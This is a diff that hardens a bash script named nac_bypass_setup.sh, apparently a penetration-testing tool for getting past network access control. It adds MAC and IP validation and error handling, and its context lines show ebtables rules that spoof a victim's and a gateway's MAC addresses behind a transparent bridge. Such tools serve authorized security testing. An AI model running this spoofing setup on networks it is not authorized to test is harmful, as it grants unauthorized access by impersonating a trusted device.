@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 # -----
 # Name: nac_bypass_setup.sh
@@ -44,7 +45,9 @@ else
     while :; do
         LAST_OCTED=$(( RANDOM % 256 ))
         # avoid .0, .1, .255 for the "random" one so it doesn't collide with the first IP or be a broadcast/network addr
-        [[ $LAST_OCTED -ne 0 && $LAST_OCTED -ne 1 && $LAST_OCTED -ne 255 ]] && break
+        if [[ $LAST_OCTED -ne 0 && $LAST_OCTED -ne 1 && $LAST_OCTED -ne 255 ]]; then
+            break
+        fi
     done
     BRIP="169.254.${THIRD_OCTET}.${LAST_OCTED}" # IP address for the bridge
     BRGW="169.254.${THIRD_OCTET}.1" # Gateway IP address for the bridge
@@ -120,6 +123,21 @@ CheckRoot() {
     fi
 }
 
+## Validate a MAC address in xx:xx:xx:xx:xx:xx form
+IsValidMac() {
+    [[ $1 =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
+}
+
+## Validate an IPv4 address, rejecting octets above 255
+IsValidIp() {
+    local ip=$1
+    local octet
+    [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] || return 1
+    for octet in ${ip//./ }; do
+        (( octet <= 255 )) || return 1
+    done
+}
+
 ## Check if we got all needed parameters
 CheckParams() {
     while getopts ":1:2:acg:f:s:t:T:hirRS" opts
@@ -190,8 +208,8 @@ InitialSetup() {
         echo
     fi
 
-    # Stop NetworkManager
-    systemctl stop NetworkManager.service
+    # Stop NetworkManager (best-effort: may already be stopped or not installed)
+    systemctl stop NetworkManager.service 2>/dev/null || true
     # Disable IPv6 temporarly
     SYSCTL_SETTING_IPv6=$(sysctl -n net.ipv6.conf.all.disable_ipv6)
     if [ "$SYSCTL_SETTING_IPv6" -eq 0 ]; then
@@ -208,15 +226,19 @@ InitialSetup() {
     declare -a NTP_SERVICES=("ntp.service" "ntpsec.service" "chronyd.service" "systemd-timesyncd.service")
     for NTP_SERVICE in "${NTP_SERVICES[@]}"
     do
-        NTP_SERVICE_STATUS=$(systemctl is-active $NTP_SERVICE)
-        if [ $NTP_SERVICE_STATUS == "active" ]; then
-            systemctl stop $NTP_SERVICE
+        if systemctl is-active --quiet "$NTP_SERVICE"; then
+            systemctl stop "$NTP_SERVICE"
         fi
     done
-    timedatectl set-ntp false
+    timedatectl set-ntp false || true
 
     # get SWINT MAC address automatically
     SWMAC=`ifconfig $SWINT | grep -i ether | awk '{ print $2 }'`
+
+    if ! IsValidMac "$SWMAC"; then
+        echo -e "$WARN [ ! ] Could not determine a valid switch-side MAC address (SWMAC='$SWMAC') from $SWINT.$TXTRST"
+        exit 1
+    fi
 
     if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
         echo
@@ -244,7 +266,7 @@ InitialSetup() {
     # Ensuring br_netfilter is available for bridge iptables support
     if [ ! -d /proc/sys/net/bridge ]; then
         echo -e "$INFO [ * ] br_netfilter not loaded, attempting to load module$TXTRST"
-        modprobe br_netfilter 2>/dev/null
+        modprobe br_netfilter 2>/dev/null || true
         sleep 1
     fi
 
@@ -292,8 +314,9 @@ ConnectionSetup() {
         echo
     fi
 
-    ethtool -r $COMPINT
-    ethtool -r $SWINT
+    # Best-effort: not every driver supports forcing a renegotiation
+    ethtool -r $COMPINT 2>/dev/null || true
+    ethtool -r $SWINT 2>/dev/null || true
 
     if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
         echo
@@ -332,6 +355,22 @@ ConnectionSetup() {
         echo
     fi
 
+    ## Validate what we captured (or were given) before we act on it
+    if ! IsValidMac "$COMPMAC"; then
+        echo -e "$WARN [ ! ] Could not determine a valid victim MAC address (COMPMAC='$COMPMAC'). Re-run with -t <MAC> to set it manually.$TXTRST"
+        exit 1
+    fi
+
+    if ! IsValidMac "$GWMAC"; then
+        echo -e "$WARN [ ! ] Could not determine a valid gateway MAC address (GWMAC='$GWMAC'). Re-run with -g <MAC> to set it manually.$TXTRST"
+        exit 1
+    fi
+
+    if ! IsValidIp "$COMIP"; then
+        echo -e "$WARN [ ! ] Could not determine a valid victim IP address (COMIP='$COMIP'). Re-run with -T <IP> to set it manually.$TXTRST"
+        exit 1
+    fi
+
     ## Going Silent
     $CMD_ARPTABLES -A OUTPUT -o $SWINT -j DROP
     $CMD_ARPTABLES -A OUTPUT -o $COMPINT -j DROP
@@ -350,6 +389,12 @@ ConnectionSetup() {
     if [ "$OPTION_CONNECTION_SETUP_ONLY" -eq 1 ]; then
         SWMAC=`ifconfig $SWINT | grep -i ether | awk '{ print $2 }'`
     fi
+
+    if ! IsValidMac "$SWMAC"; then
+        echo -e "$WARN [ ! ] Could not determine a valid switch-side MAC address (SWMAC='$SWMAC') from $SWINT.$TXTRST"
+        exit 1
+    fi
+
     $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
     $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC
     $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $COMPINT -j snat --to-src $GWMAC
@@ -448,7 +493,7 @@ ConnectionSetup() {
     $CMD_IPTABLES -D OUTPUT -o $SWINT -j DROP
 
     ## Housecleaning
-    rm $TEMP_FILE
+    rm -f "$TEMP_FILE"
 
     ## All done!
     if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
@@ -467,12 +512,12 @@ Reset() {
     fi
 
     ## Bringing bridge down
-    ifconfig $BRINT down
-    brctl delbr $BRINT
+    ifconfig $BRINT down 2>/dev/null || true
+    brctl delbr $BRINT 2>/dev/null || true
 
     ## Delete default route
-    arp -d -i $BRINT $BRGW $GWMAC
-    route del default dev $BRINT
+    arp -d -i $BRINT $BRGW $GWMAC 2>/dev/null || true
+    route del default dev $BRINT 2>/dev/null || true
 
     # Flush EB, ARP- and IPTABLES
     $CMD_EBTABLES -F
